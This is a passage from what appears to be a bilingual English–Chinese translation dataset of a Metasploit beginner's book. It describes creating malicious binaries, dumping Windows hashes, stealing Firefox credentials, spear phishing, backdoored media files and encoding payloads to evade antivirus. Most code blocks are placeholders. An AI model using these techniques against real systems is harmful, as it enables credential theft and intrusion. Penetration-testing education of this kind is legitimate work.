  type: TYPE_NORMAL
  zh: 导航到`/opt/metasploit/msf3/`。在这里，你会找到一个名为`msfpayload`的可执行脚本。使用`msfpayload`，我们可以创建一个恶意的二进制文件，然后将其给受害者，帮助我们利用他/她的系统。
- en: Dumping Windows hashes
  id: totrans-222
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 转储Windows哈希
- en: Post exploitation, if we wish to get the username and passwords of all the users
    logged in to the system, then we need to dump those hashes. For this we have a
    script in the meterpreter module. The name of the command is `hashdump`.
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: 在后期利用中，如果我们希望获取系统中所有登录用户的用户名和密码，那么我们需要转储这些哈希。为此，我们在meterpreter模块中有一个脚本。命令的名称是`hashdump`。
- en: 'The syntax for this command is as follows:'
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令的语法如下：
- en: '[PRE20]'
  id: totrans-225
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: 'The following screenshot explains the commands in action:'
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图解释了命令的执行过程：
- en: '![Dumping Windows hashes](img/4483OT_04_21.jpg)'
  id: totrans-227
  prefs: []
  type: TYPE_IMG
  zh: '![转储Windows哈希](img/4483OT_04_21.jpg)'
- en: After dumping these hashes, we can use a tool like John the Ripper to crack
    the passwords.
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: 转储这些哈希后，我们可以使用类似John the Ripper的工具来破解密码。
- en: Browser credential stealing using third-party tools
  id: totrans-229
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用第三方工具窃取浏览器凭据
- en: We have seen the concepts of channel creation and executing processes from remote
    systems on the target. We have also seen the upload/download commands in meterpreter.
    Using these concepts, if we can upload an EXE such as `firepassword` that steals
    the saved credentials in a Firefox browser, then this gives us an increased coverage
    for the attack from the system to their online footprints.
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经看到了在目标上创建通道和执行远程系统中的进程的概念。我们还在meterpreter中看到了上传/下载命令。使用这些概念，如果我们可以上传一个像`firepassword`这样的EXE文件，它可以窃取Firefox浏览器中保存的凭据，那么这将增加我们从系统到他们的在线足迹的攻击范围。
- en: '![Browser credential stealing using third-party tools](img/4483OT_04_22.jpg)'
  id: totrans-231
  prefs: []
  type: TYPE_IMG
  zh: '![使用第三方工具窃取浏览器凭据](img/4483OT_04_22.jpg)'
- en: This section covered the major features, which you need to know as a beginner.
    I am sure from this point onwards, you can explore Metasploit all by yourself
    with a little guidance here and there. The sole aim of this section was to provide
    you with a jumpstart that was needed to get your hands dirty with the tool.
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: 本节涵盖了作为初学者需要了解的主要功能。我相信从这一点开始，你可以在这里和那里的一点指导下自己探索Metasploit。本节的唯一目的是为您提供所需的起步，以便使用该工具。
- en: Social engineering toolkit – an extension to Metasploit
  id: totrans-233
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 社会工程工具包- Metasploit的扩展
- en: So far, we have covered various aspects of Metasploit in this book. In this
    section, let's extend our knowledge to the Metasploit extensions used with the
    social engineering toolkit. Social engineering is a classical method of exploiting
    the human mind. The target may use any high-class security tools and defense to
    secure itself from the attackers, but as we all know, an organization is as secure
    as its weakest link. What gets even more interesting is that there can never be
    a patch to human stupidity. The social engineering toolkit facilitates these kinds
    of attacks, which require a security aware human mind to defend it; if not, the
    exploitation is unstoppable by any defense mechanism.
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们在本书中已经涵盖了Metasploit的各个方面。在本节中，让我们将知识扩展到与社会工程工具包一起使用的Metasploit扩展。社会工程是一种利用人类思维的经典方法。目标可能使用任何高级安全工具和防御来保护自己免受攻击者的攻击，但众所周知，一个组织的安全程度取决于其最薄弱的环节。更有趣的是，人类愚蠢是永远无法修补的。社会工程工具包促进了这类攻击，这些攻击需要一个安全意识的人类思维来进行防御；如果没有，任何防御机制都无法阻止攻击。
- en: 'As we open the social engineering toolkit, we see a plethora of options on
    our plate as shown in the following screenshot:'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们打开社会工程工具包时，我们会看到以下截图中的各种选项：
- en: '![Social engineering toolkit – an extension to Metasploit](img/4483OT_04_23.jpg)'
  id: totrans-236
  prefs: []
  type: TYPE_IMG
  zh: '![社会工程工具包- Metasploit的扩展](img/4483OT_04_23.jpg)'
- en: 'Let''s enumerate the options available under this framework:'
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们枚举一下这个框架下可用的选项：
- en: '**Social engineering attacks**: This category of attacks includes various subcategories
    such as spear phishing attacks, website attacks, crafting media payloads, mass
    mailer attacks, SMS spoofing attacks, QR code-based attacks, and so on. In the
    spear phishing attack, we have a single target and the attack is like how we spread
    a spear to catch a fish—thus its name; spear phishing. In crafting media payloads,
    we basically use MP3/audio formats or videos, PPTX files, PDFs, and so on to send
    to the victim. These will be bound with backdoors to grant access to the remote
    system. Of course, obfuscation of the payload is also done before sending the
    infected media file so that we evade the IDS/IPS and antivirus systems.'
  id: totrans-238
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**社会工程攻击**：这类攻击包括各种子类别，如鱼叉式网络钓鱼攻击、网站攻击、制作媒体有效负载、大规模邮件攻击、短信欺骗攻击、基于QR码的攻击等。在鱼叉式网络钓鱼攻击中，我们有一个单一目标，攻击就像我们扔鱼叉捕捉鱼一样，因此得名；鱼叉式网络钓鱼。在制作媒体有效负载中，我们基本上使用MP3/音频格式或视频、PPTX文件、PDF等发送给受害者。这些将绑定后门以授予对远程系统的访问权限。当然，在发送受感染的媒体文件之前，还会对有效负载进行混淆，以便逃避IDS/IPS和防病毒系统。'
- en: '**Fast-track attacks modules**: This is integration with the previous fast-track
    pen testing platform. The social engineering toolkit now houses these platforms
    under its roof as well.'
  id: totrans-239
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**快速攻击模块**：这是与以前的快速渗透测试平台集成。社会工程工具包现在也将这些平台纳入其旗下。'
- en: '**Third-party module integration**: This sees two attacks under its hood; the
    famous Java applet based exploit and the Remote Administration tool based on Tommy
    Edition.'
  id: totrans-240
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**第三方模块集成**：这个模块下有两种攻击；著名的基于Java小程序的利用和基于Tommy Edition的远程管理工具。'
- en: The social engineering toolkit can also be used to update the Metasploit framework
    apart from the `msfupdate` command covered previously in the book.
  id: totrans-241
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 社会工程工具包还可以用于更新Metasploit框架，除了本书中之前介绍的`msfupdate`命令。
- en: The Metasploit extension can be found under the social engineering attack menu
    under the **Create payload** suboption. In the following screenshot, we can see
    the meterpreter extension based payloads under the social engineering toolkit.
    The way to run these still remains the same using the regular Metasploit framework
    commands when exploiting the target.
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit扩展可以在**创建有效负载**子选项下的社会工程攻击菜单中找到。在下面的截图中，我们可以看到基于meterpreter的扩展有效负载在社会工程工具包下。在攻击目标时，使用这些的方式仍然是使用常规的Metasploit框架命令。
- en: '![Social engineering toolkit – an extension to Metasploit](img/4483OT_04_24.jpg)'
  id: totrans-243
  prefs: []
  type: TYPE_IMG
  zh: '![社会工程工具包- Metasploit的扩展](img/4483OT_04_24.jpg)'
- en: Using msfencode scripts in the attacks
  id: totrans-244
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 在攻击中使用msfencode脚本
- en: I would like to provide a short note on msfencode available in the Metasploit
    framework. The msfpayload script can be used to create a malicious executable
    but to make it evade the IPS/IDS and antivirus systems, we need to encode/obfuscate
    the payload using an encoder. Msfencode does the task for us by providing a variety
    of encoding options.
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: 我想简要介绍一下Metasploit框架中可用的msfencode。msfpayload脚本可用于创建恶意可执行文件，但为了使其逃避IPS/IDS和防病毒系统，我们需要使用编码器对有效负载进行编码/混淆。Msfencode通过提供各种编码选项来为我们执行任务。
- en: Nmap and Metasploit
  id: totrans-246
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Nmap和Metasploit
- en: 'Nmap is an independent tool in itself, but this can also be called within Metasploit
    for a quick port scan to be performed. An example would be as follows:'
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: Nmap本身是一个独立的工具，但也可以在Metasploit中调用，进行快速端口扫描。例如：
- en: '**Syntax**: `msf>nmap –sV ip_address`'
  id: totrans-248
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**语法**：`msf>nmap –sV ip_address`'
- en: '**Syntax**: `msf>nmap –O ip_address`'
  id: totrans-249
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**语法**：`msf>nmap –O ip_address`'
- en: The first command scans the services running on the ports in the target system,
    whereas the second command grabs the banners of the target system.
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: 第一个命令扫描目标系统上运行的端口的服务，而第二个命令抓取目标系统的横幅。
- en: People and places you should get to know
  id: totrans-251
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 你应该了解的人和地方
- en: If you need help with Metasploit, here are some people and places that will
    prove invaluable.
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您需要有关Metasploit的帮助，以下是一些对您非常有价值的人和地方。
- en: Official sites
  id: totrans-253
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 官方网站
- en: 'Homepage: [http://www.metasploit.com/](http://www.metasploit.com/)'
  id: totrans-254
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 主页：[http://www.metasploit.com/](http://www.metasploit.com/)
- en: 'Manual and documentation: [http://help.metasploit.com/](http://help.metasploit.com/)'
  id: totrans-255
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 手册和文档：[http://help.metasploit.com/](http://help.metasploit.com/)
- en: 'Wiki: [http://wiki.backbox.org/index.php/Metasploit](http://wiki.backbox.org/index.php/Metasploit)'
  id: totrans-256
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Wiki：[http://wiki.backbox.org/index.php/Metasploit](http://wiki.backbox.org/index.php/Metasploit)
- en: 'Blog: [https://community.rapid7.com/community/metasploit/blog](https://community.rapid7.com/community/metasploit/blog)'
  id: totrans-257
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 博客：[https://community.rapid7.com/community/metasploit/blog](https://community.rapid7.com/community/metasploit/blog)
- en: 'Source code: [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)'
  id: totrans-258
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 源代码：[https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
- en: Articles and tutorials
  id: totrans-259
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 文章和教程
- en: 'There are countless tutorials and articles on the web covering various aspect
    of Metasploit. You can search for a specific task to do on a search engine (Google,
    Bing, and Yahoo) and might end up visiting exciting websites with clear explanations
    on how to do it. Metasploit users are everywhere and their posts on the web extend
    to picture albums, source codes, and also video tutorials. The following are some
    sites that will be familiar to GIMP users:'
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 网络上有无数的教程和文章涵盖了Metasploit的各个方面。您可以在搜索引擎（Google、Bing和Yahoo）上搜索特定的任务，并可能最终访问到一些令人兴奋的网站，上面清晰地解释了如何执行这些任务。Metasploit用户随处可见，他们在网络上发布的内容包括图片相册、源代码，还有视频教程。以下是一些对GIMP用户来说可能熟悉的网站：
- en: '[http://www.offensive-security.com/metasploit-unleashed/Main_Page](http://www.offensive-security.com/metasploit-unleashed/Main_Page)'
  id: totrans-261
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://www.offensive-security.com/metasploit-unleashed/Main_Page](http://www.offensive-security.com/metasploit-unleashed/Main_Page)'
- en: '[http://backtracktutorials.com/metasploit-tutorial/](http://backtracktutorials.com/metasploit-tutorial/)'
  id: totrans-262
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://backtracktutorials.com/metasploit-tutorial/](http://backtracktutorials.com/metasploit-tutorial/)'
- en: '[http://www.securitytube.net/video/1175](http://www.securitytube.net/video/1175)
    (*Metasploit Mega primer*, *Vivek Ramachandra*)'
  id: totrans-263
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://www.securitytube.net/video/1175](http://www.securitytube.net/video/1175)（*Metasploit
    Mega primer*, *Vivek Ramachandra*）'
- en: Community
  id: totrans-264
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 社区
- en: 'If you are looking to get involved in Metasploit, these links will be useful
    for you:'
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您想参与Metasploit，这些链接对您会很有用：
- en: 'Official mailing list: [http://mail.metasploit.com/mailman/listinfo/framework](http://mail.metasploit.com/mailman/listinfo/framework)'
  id: totrans-266
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 官方邮件列表：[http://mail.metasploit.com/mailman/listinfo/framework](http://mail.metasploit.com/mailman/listinfo/framework)
- en: 'Official forums: [https://community.rapid7.com/welcome](https://community.rapid7.com/welcome)'
  id: totrans-267
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 官方论坛：[https://community.rapid7.com/welcome](https://community.rapid7.com/welcome)
- en: 'Unofficial forums: [http://www.backtrack-linux.org/forums/forum.php](http://www.backtrack-linux.org/forums/forum.php)'
  id: totrans-268
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 非官方论坛：[http://www.backtrack-linux.org/forums/forum.php](http://www.backtrack-linux.org/forums/forum.php)
- en: 'Official IRC channel: [https://community.rapid7.com/docs/DOC-2198](https://community.rapid7.com/docs/DOC-2198)'
  id: totrans-269
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 官方IRC频道：[https://community.rapid7.com/docs/DOC-2198](https://community.rapid7.com/docs/DOC-2198)
- en: 'User FAQ: [http://en.wikibooks.org/wiki/Metasploit/Frequently_Asked_Questions](http://en.wikibooks.org/wiki/Metasploit/Frequently_Asked_Questions)'
  id: totrans-270
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 用户常见问题：[http://en.wikibooks.org/wiki/Metasploit/Frequently_Asked_Questions](http://en.wikibooks.org/wiki/Metasploit/Frequently_Asked_Questions)
- en: Twitter
  id: totrans-271
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Twitter
- en: 'If you are a Twitter user, I must mention these Twitter pages:'
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您是Twitter用户，我必须提到这些Twitter页面：
- en: '[https://twitter.com/metasploit](https://twitter.com/metasploit)'
  id: totrans-273
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://twitter.com/metasploit](https://twitter.com/metasploit)'
- en: '[https://twitter.com/hdmoore](https://twitter.com/hdmoore)'
  id: totrans-274
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://twitter.com/hdmoore](https://twitter.com/hdmoore)'
- en: '[https://twitter.com/rapid7](https://twitter.com/rapid7)'
  id: totrans-275
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://twitter.com/rapid7](https://twitter.com/rapid7)'
- en: '[https://twitter.com/Backtrack5](https://twitter.com/Backtrack5)'
  id: totrans-276
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://twitter.com/Backtrack5](https://twitter.com/Backtrack5)'
- en: For more open source information, follow Packt at [http://twitter.com/#!/packtopensource](http://twitter.com/#!/packtopensource).
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 要获取更多开源信息，请关注Packt：[http://twitter.com/#!/packtopensource](http://twitter.com/#!/packtopensource)。
